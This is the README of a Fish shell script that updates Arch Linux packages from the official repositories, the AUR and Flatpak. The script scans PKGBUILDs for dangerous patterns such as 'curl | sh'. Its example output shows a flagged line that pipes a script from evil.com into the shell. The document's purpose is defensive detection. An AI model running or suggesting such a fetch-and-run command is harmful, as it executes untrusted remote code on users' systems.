Ultimate Arch Updater (Fish Shell)
A single-command, secure, and fully automated Arch Linux updater written for the Fish shell. It handles official repositories, AUR packages, and Flatpaks, performs safety audits on PKGBUILDs, cleans orphans and caches, and produces a concise system summary.
Features
Security & Disclaimer
Requirements
Installation
Configuration
Execution Flow
Example Output
License
Author
Features
Customizable AUR Safety Scanner: Inspects PKGBUILD and .install files for dangerous command patterns before updating. Allows you to whitelist trusted packages and create exceptions for known-safe commands.
Selective Updates: If a suspicious package is found, it is automatically skipped, allowing the rest of your AUR updates to proceed safely.
Comprehensive System Update: Handles pacman, AUR helpers (yay or paru), and flatpak in a single, unified command.
Automated System Cleanup: Removes orphaned packages and clears package caches from pacman and your AUR helper to save space.
Optional DNS Integration: Can automatically ensure your system is connected to Cloudflare's secure DNS via the onedns script.
Final Report: Concludes with a concise summary of your system's package counts and security status.
Security & Disclaimer
This script is a tool, not a replacement for vigilance.
Manual Auditing is Recommended: The security scanner provides an important first line of defense against common malicious patterns. However, it is not foolproof and cannot detect every possible threat. You should always manually inspect the PKGBUILD for any new or unfamiliar AUR packages.
Not 100% Robust: The scanner works by matching patterns. A sophisticated attacker could potentially obfuscate their code to evade detection.
Use at Your Own Risk: The author is not responsible for any damage to your system that may result from using this script or from installing a malicious AUR package. This tool is provided as-is, without warranty.
Requirements
Component	Purpose	Required
Fish Shell	To execute the function	✅
pacman	Core package manager	✅
yay or paru	AUR helper	✅ (one of them)
onedns	Optional secure DNS setup	Optional
flatpak	Optional app updates	Optional
pacman-contrib (paccache)	Cache cleanup	Optional
Installation
Clone the repository:
code
Bash
git clone https://github.com/karanveers969/ultimate-arch-updater.git
cd ultimate-arch-updater
Install the function into your Fish configuration directory:
code
Bash
mkdir -p ~/.config/fish/functions
cp update.fish ~/.config/fish/functions/update.fish
Open a new terminal and run the updater:
code
Bash
update
Configuration
All customization is done by editing the configuration block at the top of the ~/.config/fish/functions/update.fish file.
CONFIG_TRUSTED_PACKAGES
Add package names to this list to completely bypass the security scan for them. This is for packages you have already verified and trust completely.
code
Fish
# Example:
set -l CONFIG_TRUSTED_PACKAGES betterbird-bin localsend-bin octopi
CONFIG_EXCEPTION_PATTERNS
This allows you to create exceptions for specific commands that might otherwise be flagged as suspicious. If a line containing a dangerous pattern (like curl | sh) also contains one of these exception strings, it will be ignored. This is perfect for whitelisting known-safe installers.
code
Fish
# Example: The official Rust installer uses curl | sh.
# To prevent the scanner from flagging it, we can add its unique URL as an exception.
set -l CONFIG_EXCEPTION_PATTERNS 'sh.rustup.rs'
CONFIG_DNS_ENABLED
Set to true to enable the Cloudflare DNS check, or false to disable it entirely.
code
Fish
set -l CONFIG_DNS_ENABLED true
Execution Flow
Connects to Cloudflare DNS (if onedns is installed and enabled).
Updates official Arch repositories via pacman.
Scans all installed AUR packages for suspicious patterns, honoring your trusted packages and exceptions.
Updates AUR packages, automatically skipping any packages that were flagged as suspicious.
Updates Flatpak applications.
Removes orphaned packages.
Cleans pacman, yay, and/or paru caches.
Prints a concise system summary, including a list of any packages that were skipped.
Example Output
code
Code
[...]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🧠 Scanning AUR Packages for Security Issues
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 Found 25 AUR package(s). Scanning...
  - betterbird-bin (whitelisted, skipped)
🚨 CRITICAL: Suspicious pattern in 'some-bad-package' (PKGBUILD)!
   Line: curl http://evil.com/script.sh | sh

⚠️  Found 1 suspicious package(s). Review /home/user/.aur_security_scan.log

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🧠 Updating AUR Packages
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⛔ Suspicious packages detected; they will be skipped.
   - Skipping: some-bad-package
:: Synchronizing package databases...
[...]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🧠 System Update Complete
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 Status:
  - Explicit Packages: 288
  - AUR Packages:      25
  - Flatpak Apps:      3

🔒 Security Alert: 1 suspicious AUR package(s) detected.
   The following were SKIPPED:
     - some-bad-package
   Review log: /home/user/.aur_security_scan.log

done ✅
License
MIT License — see LICENSE for details.
Author
https://github.com/karanveers969
